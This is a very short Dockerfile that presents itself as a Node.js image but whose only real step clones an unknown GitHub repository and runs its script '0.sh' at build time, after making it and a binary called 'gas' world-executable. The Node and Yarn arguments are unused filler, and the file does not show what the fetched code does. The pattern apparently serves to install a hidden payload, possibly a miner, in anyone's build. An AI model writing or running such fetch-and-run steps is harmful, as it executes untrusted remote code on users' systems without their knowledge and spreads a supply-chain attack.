FROM marshall AS nodejs

ARG NODE_VERSION
ARG YARN_VERSION
ARG PATH="/app/node_modules/.bin:${PATH}"

RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
